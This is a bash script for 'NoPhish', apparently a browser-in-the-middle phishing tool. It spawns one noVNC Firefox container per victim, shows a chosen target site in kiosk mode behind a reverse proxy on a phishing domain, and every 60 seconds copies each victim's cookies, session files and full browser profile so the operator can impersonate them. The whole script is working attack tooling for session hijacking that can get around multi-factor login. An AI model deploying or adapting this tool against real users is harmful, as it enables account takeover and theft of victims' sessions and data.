#!/bin/bash

	helpFunction()
	{
	   echo ""
	   echo "Usage: $0 -u No. Users -d Domain -t Target"
	   echo -e "\t -u Number of users - please note for every user a container is spawned so don't go crazy"
	   echo -e "\t -d Domain which is used for phishing"
	   echo -e "\t -t Target website which should be displayed for the user"
	   echo -e "\t -e Export format"
	   echo -e "\t -s true / false if ssl is required - if ssl is set crt and key file are needed"
	   echo -e "\t -c Full path to the crt file of the ssl certificate"
	   echo -e "\t -k Full path to the key file of the ssl certificate"
	   echo -e "\t -a Adjust default user agent string"  
	   echo -e "\t -z Compress profile to zip - will be ignored if parameter -e is set"
	   exit 1 # Exit script after printing help
	}
	
	while getopts "u:d:t:s:c:k:e:a:z:" opt
	do
		case "$opt" in
		u ) User="$OPTARG" ;;
		d ) Domain="$OPTARG" ;;
		t ) Target="$OPTARG" ;;
		e ) OFormat="$OPTARG" ;;
		s ) SSL="$OPTARG" ;;
		c ) cert="$OPTARG" ;;
		k ) key="$OPTARG" ;;
		a ) useragent=$OPTARG ;;
		z ) rzip=$OPTARG ;;
		? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
		esac
	done



# Begin script in case all parameters are correct

# Loop for every user a docker container need to be started 
 
# Write of default config for apache

case "$1" in 

"install")
	sudo docker build -t vnc-docker -f ./VNC-Dockerfile ./
	sudo docker build -t rev-proxy -f ./PROXY-Dockerfile ./
	;;
"cleanup")
	sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q)
	sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q)
	while true; do
	    read -p "Do you want to perform a full cleanup? " yn
	    case $yn in
	    [Yy]* ) 
			sudo docker rmi -f $(sudo docker images --filter=reference="vnc-docker" -q)
			sudo docker rmi -f $(sudo docker images --filter=reference="rev-proxy" -q)
			exit;;
	    [Nn]* ) exit;;
	    * ) echo "Please answer yes or no.";;
	esac
	done
	;;
*)
	
	# Print helpFunction in case parameters are empty
	if [ -z "$User" ] || [ -z "$Domain" ] || [ -z "$Target" ]
	then
		echo "Some or all of the parameters are empty";
		helpFunction
	fi
	
	if [ -z "$rzip" ]
	then
		rzip=true
	fi
	
	if [ -n "$SSL" ]
	then
		if [ -z "$cert" ] || [ -z "$key" ]
		then
		echo "Some or all of the parameters are empty";
		helpFunction
		elif [ ! -f "$cert" ] || [ ! -f "$key" ]
		then 
		echo "Certificate and / or Key file could not be found."
		exit 1
		fi
	fi

	START=1
	END=$User
	printf "[-] Configuration file generating\033[0K\r" 
	echo "NameVirtualHost *" > ./proxy/000-default.conf
	
	if [ -n "$SSL" ]
	then
		echo "<VirtualHost *:443>" >> ./proxy/000-default.conf
		echo "
		SSLEngine on
	   	SSLCertificateFile /etc/ssl/certs/server.crt
	   	SSLCertificateKeyFile /etc/ssl/private/server.key
		" >> ./proxy/000-default.conf
	else
		echo "<VirtualHost *:80>" >> ./proxy/000-default.conf
	fi
	 
        printf "[+] Configuration file generated \n" 
        
        htmlpath="./output/status.html"
        if [ -e $htmlpath ]
        then
        	rm -rf $htmlpath
        fi
        
        echo '
	<!DOCTYPE html>
	<html>
	<head>
	  <title>NoPhis status</title>
	  <style>
	    body {
	      background-color: rgb(9, 25, 75); /* Set the background to black */
	      margin: 0; /* Reset default body margin */
	      padding: 0; /* Reset default body padding */
	    }

	    #container {
	      background-color: rgb(56, 74, 99);
	      width: 100vh; /* Set equal width and height */
	      height: 50vh;
	      border-radius: 10px; /* Add rounded corners */
	      overflow: hidden; /* Hide the scrollbars */
	      display: flex; /* Use flexbox */
	      align-items: center; /* Vertically center the content */
	      justify-content: center; /* Horizontally center the content */
	      margin: 20px auto; /* Center the container */
	      position: relative; /* Create a context for absolute positioning */
	    }

	    #scaled-iframe {
	      width: 100%;
	      height: 100%;
	      transform: scale(0.9);
	      transform-origin: middle;
	    }

	    #button {
	      background-color: orange;
	      color: white;
	      border: none;
	      border-radius: 5px;
	      padding: 10px 40px;
	      font-size: 16px;
	      cursor: pointer;
	      margin-right: 35px; /* Adjust the margin-left as per your preference */
	      text-decoration: none; /* Remove underline */
	      white-space: nowrap;
	    }
	  </style>
	</head>
	<body>
	' > ./output/status.html
        
	declare -a urls=()
	printf "[-] Starting containers \033[0K\r\n"  
	for (( c=$START; c<=$END; c++ ))
	do
	    PW=$(openssl rand -hex 14)
	    sudo docker run -dit -p690$c:6901 --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker &> /dev/null
	    sleep 1
	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
	    sleep 1
	    sudo docker exec vnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
	    if [ -n "$useragent" ]
	    then
	    	echo 'user_pref("general.useragent.override","'$useragent'");' > ./vnc/user.js
	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/
	    	sudo docker exec vnc-user$c /bin/bash -c 'find -name prefs.js -exec dirname {} \; | xargs cp /home/headless/user.js '
	    else
	    	echo 'user_pref("general.useragent.override","This user was phished by NoPhish");' > ./vnc/user.js
	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
	    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "	    	  
	    fi
	    
	    sleep 1
	    sudo docker exec vnc-user$c sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
	    sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null
	    
	    CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
	    
	    echo "
		<Location /$PW>
		ProxyPass http://$CIP:6901
		ProxyPassReverse http://$CIP:6901
		</Location>
		<Location /$PW/websockify>
		ProxyPass ws://$CIP:6901/websockify
		ProxyPassReverse ws://$CIP:6901/websockify
		</Location>
	" >> ./proxy/000-default.conf
	    printf "[-] Starting containers $c of $END\033[0K\r"

	    
	if [ -n "$SSL" ]
	then
		echo "
		  <div id='container'>
    		    <iframe id='scaled-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
    		    <a href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' id='button'>View Session</a>
  		  </div>
		" >> ./output/status.html
		urls+=("https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
	else
		echo "
		  <div id='container'>
    		    <iframe id='scaled-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
    		    <a href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' id='button'>View Session $c</a>
  		  </div>
		" >> ./output/status.html
		urls+=("http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
	fi
	done
	echo "
	</body>
	</html>
        " >> ./output/status.html
	echo "</VirtualHost>" >> ./proxy/000-default.conf
        printf "[+] VNC Containers started                          \n"  
        printf "[-] Starting reverse proxy \033[0K\r\n"  
	# start of rev proxy
	if [ -n "$SSL" ]
	then
		sudo docker run -dit -p443:443 --name rev-proxy rev-proxy /bin/bash     &> /dev/null
	else
		sudo docker run -dit -p80:80 --name rev-proxy rev-proxy /bin/bash       &> /dev/null
	fi
	
	sleep 5

	if [ -n "$SSL" ]
	then
		sudo docker cp $cert rev-proxy:/etc/ssl/certs/server.crt 
		sudo docker cp $key rev-proxy:/etc/ssl/private/server.key
	fi
	  
	sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
	sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
        
        
        
        printf "[+] Reverse proxy running \033[0K\r\n"  
          
	printf "[+] Setup completed \n"
	printf "[+] Use the following URLs:\n"   
	for value in "${urls[@]}"
	do
		echo $value
	done
	
	dbpath="./output/phis.db"

        if [ -e $dbpath ]
        then
        	rm -rf $dbpath
        fi
	
	printf "[-] Starting Loop to collect sessions and cookies from containers\n" 
	printf "[+] You can check and view the open session by use of the status.html in the output directory\n" 
	#Start a loop which copies the cookies from the containers
	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
	trap 'printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
	sleep 60
	while :
	do
	for (( c=$START; c<=$END; c++ ))
	do
           pushd ./output &> /dev/null
           sudo docker exec vnc-user$c sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
           sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
           sleep 2
           sudo docker cp vnc-user$c:/home/headless/recovery.jsonlz4 ./user$c-recovery.jsonlz4
           sudo docker cp vnc-user$c:/home/headless/cookies.sqlite ./user$c-cookies.sqlite
           sudo docker exec vnc-user$c sh -c "rm -f /home/headless/recovery.jsonlz4"
           sudo docker exec vnc-user$c sh -c "rm -f /home/headless/cookies.sqlite"
           sleep 2
           if [ -n "$OFormat" ]
	   then
		python3 ./session-collector.py ./user$c-recovery.jsonlz4 simple
		python3 ./cookies-collector.py ./user$c-cookies.sqlite simple
	   else
		sudo docker exec vnc-user$c sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
		sudo docker cp vnc-user$c:/home/headless/ffprofile ./phis$c-ffprofile
		sudo docker exec vnc-user$c sh -c "rm -rf /home/headless/ffprofile"
		sudo chown -R 1000 ./phis$c-ffprofile
		
		if [ "$rzip" = true ] 
		then
		   zip -r phis$c-ffprofile.zip phis$c-ffprofile/ &> /dev/null
		   rm -r phis$c-ffprofile/
		fi
		python3 ./session-collector.py ./user$c-recovery.jsonlz4 default
		python3 ./cookies-collector.py ./user$c-cookies.sqlite default
	   
	   fi

	   
           rm -r -f ./user$c-recovery.jsonlz4 
           rm -r -f ./user$c-cookies.sqlite
           rm -r -f ./user$c-cookies.sqlite*
           python3 ./status.py $c "${urls[$(($c - 1))]}"
	   
	   popd &> /dev/null
	done

	sleep 60
	echo -e "\033[$((($c * 3) - 2))A"
	done

	;;
esac
